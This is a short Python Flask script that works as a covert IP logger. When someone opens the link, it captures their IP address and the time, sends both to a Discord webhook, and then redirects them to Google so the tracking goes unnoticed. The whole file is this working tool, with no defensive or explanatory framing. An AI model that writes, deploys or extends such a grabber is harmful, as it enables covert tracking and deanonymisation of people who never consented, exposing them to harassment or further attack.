from flask import Flask, request, redirect
from datetime import datetime
import requests
import os

app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = os.getenv("DISCORD_WEBHOOK")
    if not webhook_url:
        return
    data = {
        "content": None,
        "embeds": [
            {
                "title": "New Visitor IP",
                "description": f"IP: {ip}\nTime: {date}",
                "color": 5814783
            }
        ]
    }
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_ip(ip, date)
    return redirect("https://google.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
